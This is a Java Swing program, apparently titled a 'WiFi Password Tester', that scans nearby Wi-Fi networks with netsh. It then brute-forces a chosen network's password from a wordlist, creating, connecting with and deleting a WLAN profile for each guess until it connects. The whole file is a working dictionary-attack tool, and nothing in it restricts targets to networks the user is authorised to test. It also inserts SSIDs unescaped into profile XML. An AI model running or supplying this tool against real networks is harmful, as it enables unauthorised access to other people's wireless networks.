import javax.swing.*;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.List;
import java.util.regex.*;

public class WiFiPasswordTesterGUI extends JFrame {

    private DefaultListModel<WiFiNetwork> networkListModel = new DefaultListModel<>();
    private JList<WiFiNetwork> networkJList = new JList<>(networkListModel);
    private JTextField wordlistField = new JTextField("wordlist.txt");
    private JTextArea logArea = new JTextArea();
    private JButton scanButton = new JButton("Scan Networks");
    private JButton startButton = new JButton("Start Testing");

    public WiFiPasswordTesterGUI() {
        setTitle("WiFi Password Tester");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setSize(700, 500);
        setLocationRelativeTo(null);

        JPanel mainPanel = new JPanel(new BorderLayout(10, 10));
        mainPanel.setBorder(new EmptyBorder(10, 10, 10, 10));
        setContentPane(mainPanel);

        // Top panel for scan and list
        JPanel topPanel = new JPanel(new BorderLayout(10, 10));
        mainPanel.add(topPanel, BorderLayout.NORTH);

        scanButton.addActionListener(e -> scanNetworks());
        topPanel.add(scanButton, BorderLayout.WEST);

        networkJList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        JScrollPane listScroll = new JScrollPane(networkJList);
        listScroll.setPreferredSize(new Dimension(300, 150));
        topPanel.add(listScroll, BorderLayout.CENTER);

        // Middle panel for wordlist input
        JPanel middlePanel = new JPanel(new BorderLayout(5, 5));
        mainPanel.add(middlePanel, BorderLayout.CENTER);

        middlePanel.add(new JLabel("Wordlist Path:"), BorderLayout.WEST);
        middlePanel.add(wordlistField, BorderLayout.CENTER);

        startButton.addActionListener(e -> startTesting());
        middlePanel.add(startButton, BorderLayout.EAST);

        // Bottom panel for logs
        logArea.setEditable(false);
        JScrollPane logScroll = new JScrollPane(logArea);
        logScroll.setPreferredSize(new Dimension(600, 250));
        mainPanel.add(logScroll, BorderLayout.SOUTH);
    }

    private void log(String message) {
        SwingUtilities.invokeLater(() -> {
            logArea.append(message + "\n");
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });
    }

    private void scanNetworks() {
        scanButton.setEnabled(false);
        networkListModel.clear();
        log("Scanning Wi-Fi networks...");

        new Thread(() -> {
            try {
                List<WiFiNetwork> networks = scanNetworksInternal();
                if (networks.isEmpty()) {
                    log("No Wi-Fi networks found.");
                } else {
                    for (WiFiNetwork net : networks) {
                        networkListModel.addElement(net);
                    }
                    log("Scan complete. Select a network from the list.");
                }
            } catch (Exception ex) {
                log("Error scanning networks: " + ex.getMessage());
            } finally {
                SwingUtilities.invokeLater(() -> scanButton.setEnabled(true));
            }
        }).start();
    }

    private void startTesting() {
        WiFiNetwork selectedNetwork = networkJList.getSelectedValue();
        if (selectedNetwork == null) {
            JOptionPane.showMessageDialog(this, "Please select a Wi-Fi network first.", "No Network Selected", JOptionPane.WARNING_MESSAGE);
            return;
        }

        String wordlistPath = wordlistField.getText().trim();
        if (wordlistPath.isEmpty()) {
            wordlistPath = "wordlist.txt";
            wordlistField.setText(wordlistPath);
        }

        File wordlistFile = new File(wordlistPath);
        if (!wordlistFile.exists()) {
            JOptionPane.showMessageDialog(this, "Wordlist file not found: " + wordlistPath, "File Not Found", JOptionPane.ERROR_MESSAGE);
            return;
        }

        startButton.setEnabled(false);
        scanButton.setEnabled(false);
        log("Starting password attempts on network: " + selectedNetwork.ssid);

        new Thread(() -> {
            try {
                boolean success = tryPasswords(selectedNetwork, wordlistFile);
                if (success) {
                    log("Password found and connected successfully!");
                    JOptionPane.showMessageDialog(this, "Password found and connected successfully!", "Success", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    log("Password not found in wordlist.");
                    JOptionPane.showMessageDialog(this, "Password not found in wordlist.", "Failure", JOptionPane.INFORMATION_MESSAGE);
                }
            } catch (Exception ex) {
                log("Error during password testing: " + ex.getMessage());
                JOptionPane.showMessageDialog(this, "Error: " + ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            } finally {
                SwingUtilities.invokeLater(() -> {
                    startButton.setEnabled(true);
                    scanButton.setEnabled(true);
                });
            }
        }).start();
    }

    // --- Core logic methods below ---

    private List<WiFiNetwork> scanNetworksInternal() throws IOException, InterruptedException {
        List<WiFiNetwork> networks = new ArrayList<>();

        ProcessBuilder pb = new ProcessBuilder("netsh", "wlan", "show", "networks", "mode=bssid");
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        String currentSSID = null;
        String auth = null;
        String encryption = null;

        Pattern ssidPattern = Pattern.compile("^SSID \\d+ : (.+)$");
        Pattern authPattern = Pattern.compile("^Authentication\\s+: (.+)$");
        Pattern encryptionPattern = Pattern.compile("^Encryption\\s+: (.+)$");

        while ((line = reader.readLine()) != null) {
            line = line.trim();
            Matcher m;

            m = ssidPattern.matcher(line);
            if (m.find()) {
                if (currentSSID != null) {
                    networks.add(new WiFiNetwork(currentSSID, auth, encryption));
                }
                currentSSID = m.group(1);
                auth = null;
                encryption = null;
                continue;
            }

            m = authPattern.matcher(line);
            if (m.find()) {
                auth = m.group(1);
                continue;
            }

            m = encryptionPattern.matcher(line);
            if (m.find()) {
                encryption = m.group(1);
            }
        }
        // Add last network
        if (currentSSID != null) {
            networks.add(new WiFiNetwork(currentSSID, auth, encryption));
        }

        process.waitFor();
        return networks;
    }

    private boolean tryPasswords(WiFiNetwork network, File wordlist) throws IOException, InterruptedException {
        BufferedReader br = new BufferedReader(new FileReader(wordlist));
        String password;

        while ((password = br.readLine()) != null) {
            password = password.trim();
            if (password.isEmpty()) continue;

            log("Trying password: " + password);

            // Create profile XML
            String profileXml = createProfileXml(network.ssid, network.auth, network.encryption, password);
            Path tempProfile = Files.createTempFile("wifi-profile-", ".xml");
            Files.write(tempProfile, profileXml.getBytes());

            // Add profile
            ProcessBuilder addProfilePb = new ProcessBuilder("netsh", "wlan", "add", "profile", "filename=" + tempProfile.toString(), "user=current");
            Process addProfileProcess = addProfilePb.start();
            addProfileProcess.waitFor();

            // Connect
            ProcessBuilder connectPb = new ProcessBuilder("netsh", "wlan", "connect", "name=" + network.ssid, "ssid=" + network.ssid);
            Process connectProcess = connectPb.start();
            connectProcess.waitFor();

            // Wait a bit for connection to establish
            Thread.sleep(5000);

            // Check connection status
            if (isConnectedTo(network.ssid)) {
                Files.deleteIfExists(tempProfile);
                br.close();
                return true;
            }

            // Remove profile to avoid clutter
            ProcessBuilder deleteProfilePb = new ProcessBuilder("netsh", "wlan", "delete", "profile", "name=" + network.ssid);
            Process deleteProfileProcess = deleteProfilePb.start();
            deleteProfileProcess.waitFor();

            Files.deleteIfExists(tempProfile);
        }
        br.close();
        return false;
    }

    private boolean isConnectedTo(String ssid) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder("netsh", "wlan", "show", "interfaces");
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        Pattern ssidPattern = Pattern.compile("^\\s*SSID\\s+: (.+)$");
        Pattern statePattern = Pattern.compile("^\\s*State\\s+: (.+)$");

        String currentSSID = null;
        String state = null;

        while ((line = reader.readLine()) != null) {
            line = line.trim();
            Matcher m;

            m = ssidPattern.matcher(line);
            if (m.find()) {
                currentSSID = m.group(1);
                continue;
            }

            m = statePattern.matcher(line);
            if (m.find()) {
                state = m.group(1);
            }
        }
        process.waitFor();

        return "connected".equalsIgnoreCase(state) && ssid.equals(currentSSID);
    }

    private String createProfileXml(String ssid, String auth, String encryption, String password) {
        String authXml;
        String encryptXml;

        if (auth == null) auth = "";
        if (encryption == null) encryption = "";

        if (auth.toLowerCase().contains("wpa2")) {
            authXml = "WPA2PSK";
        } else if (auth.toLowerCase().contains("wpa3")) {
            authXml = "WPA3SAE";
        } else if (auth.toLowerCase().contains("wpa")) {
            authXml = "WPAPSK";
        } else if (auth.toLowerCase().contains("open")) {
            authXml = "open";
        } else {
            authXml = "WPA2PSK";
        }

        if (encryption.toLowerCase().contains("aes")) {
            encryptXml = "AES";
        } else if (encryption.toLowerCase().contains("tkip")) {
            encryptXml = "TKIP";
        } else {
            encryptXml = "AES";
        }

        if (authXml.equalsIgnoreCase("open")) {
            return "<?xml version=\"1.0\"?>\n" +
                    "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
                    "    <name>" + ssid + "</name>\n" +
                    "    <SSIDConfig>\n" +
                    "        <SSID>\n" +
                    "            <name>" + ssid + "</name>\n" +
                    "        </SSID>\n" +
                    "    </SSIDConfig>\n" +
                    "    <connectionType>ESS</connectionType>\n" +
                    "    <connectionMode>auto</connectionMode>\n" +
                    "    <MSM>\n" +
                    "        <security>\n" +
                    "            <authEncryption>\n" +
                    "                <authentication>open</authentication>\n" +
                    "                <encryption>none</encryption>\n" +
                    "                <useOneX>false</useOneX>\n" +
                    "            </authEncryption>\n" +
                    "        </security>\n" +
                    "    </MSM>\n" +
                    "</WLANProfile>";
        }

        return "<?xml version=\"1.0\"?>\n" +
                "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
                "    <name>" + ssid + "</name>\n" +
                "    <SSIDConfig>\n" +
                "        <SSID>\n" +
                "            <name>" + ssid + "</name>\n" +
                "        </SSID>\n" +
                "    </SSIDConfig>\n" +
                "    <connectionType>ESS</connectionType>\n" +
                "    <connectionMode>auto</connectionMode>\n" +
                "    <MSM>\n" +
                "        <security>\n" +
                "            <authEncryption>\n" +
                "                <authentication>" + authXml + "</authentication>\n" +
                "                <encryption>" + encryptXml + "</encryption>\n" +
                "                <useOneX>false</useOneX>\n" +
                "            </authEncryption>\n" +
                "            <sharedKey>\n" +
                "                <keyType>passPhrase</keyType>\n" +
                "                <protected>false</protected>\n" +
                "                <keyMaterial>" + password + "</keyMaterial>\n" +
                "            </sharedKey>\n" +
                "        </security>\n" +
                "    </MSM>\n" +
                "</WLANProfile>";
    }

    private static class WiFiNetwork {
        String ssid;
        String auth;
        String encryption;

        WiFiNetwork(String ssid, String auth, String encryption) {
            this.ssid = ssid;
            this.auth = auth;
            this.encryption = encryption;
        }

        @Override
        public String toString() {
            return ssid + " (" + (auth != null ? auth : "Unknown") + ", " + (encryption != null ? encryption : "Unknown") + ")";
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            WiFiPasswordTesterGUI gui = new WiFiPasswordTesterGUI();
            gui.setVisible(true);
        });
    }
}
